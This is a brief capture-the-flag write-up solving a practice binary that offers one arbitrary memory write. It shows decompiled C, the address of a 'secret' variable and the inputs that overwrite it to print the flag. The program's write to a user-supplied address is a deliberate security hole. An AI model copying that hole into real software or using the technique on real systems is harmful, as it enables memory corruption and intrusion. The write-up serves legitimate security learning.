### S0lv3d by H4yicl3

try to download the binary



then i analysis the code with IDA
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int stackcookie; // ecx@4
  int address; // [sp+1Ch] [bp-34h]@1
  int value; // [sp+20h] [bp-30h]@1
  FILE *flag; // [sp+24h] [bp-2Ch]@2
  char buf; // [sp+2Bh] [bp-25h]@2
  int stackcookie_1; // [sp+4Ch] [bp-4h]@1

  stackcookie_1 = *MK_FP(__GS__, 20);
  puts("Welcome! I will grant you one arbitrary write!");
  printf("Where do you want to write to? ");
  __isoc99_scanf("%p", &address);
  printf("Okay! What do you want to write there? ");
  __isoc99_scanf("%p", &value);
  printf("Writing %p to %p...\n", value, address, argv);
  *(_DWORD *)address = value;
  puts("Value written!");
  if ( secret == 0x1337BEEF )				//<---- we need change the secret become 0x1337BEEF to have the flag
  {
    puts("Woah! You changed my secret!");
    puts("I guess this means you get a flag now...");
    flag = fopen("flag.txt", "r");
    fgets(&buf, 32, flag);
    fclose(flag);
    puts(&buf);
    exit(0);
  }
  result = puts("My secret is still safe! Sorry.");
  stackcookie = *MK_FP(__GS__, 20) ^ stackcookie_1;
  return result;
}
```

find the address of secret
double click secret variable in IDA
```
.data:0804A03C secret          dd 0DEADBEEFh           ; DATA XREF: main+9Ar
```

ok !! we run the program !! 
and type 0x0804A03C like address want to write
and type 0x1337BEEF is value 

```
./write_right 
Welcome! I will grant you one arbitrary write!
Where do you want to write to? 0x0804a03c
Okay! What do you want to write there? 0x1337beef
Writing 0x1337beef to 0x804a03c...
Value written!
Woah! You changed my secret!
I guess this means you get a flag now...
```


well done!
